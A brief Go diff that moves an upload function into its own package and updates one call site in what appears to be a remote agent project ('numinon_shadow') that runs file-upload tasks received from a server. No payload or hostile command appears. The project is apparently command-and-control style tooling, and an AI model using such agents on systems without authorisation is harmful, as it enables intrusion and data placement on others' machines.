@@ -4,7 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
-	"numinon_shadow/internal/agent/command"
+	"numinon_shadow/internal/agent/command/upload"
 	"numinon_shadow/internal/models"
 	"strings"
 )
@@ -30,7 +30,7 @@ func (a *Agent) orchestrateUpload(task models.ServerTaskResponse) models.AgentTa
 		task.TaskID, args.TargetFilename, args.TargetDirectory)
 
 	// Call the "doer" function
-	uploadResult, err := command.DoUpload(args)
+	uploadResult, err := upload.DoUpload(args)
 
 	// Prepare the final TaskResult
 	finalResult := models.AgentTaskResult{
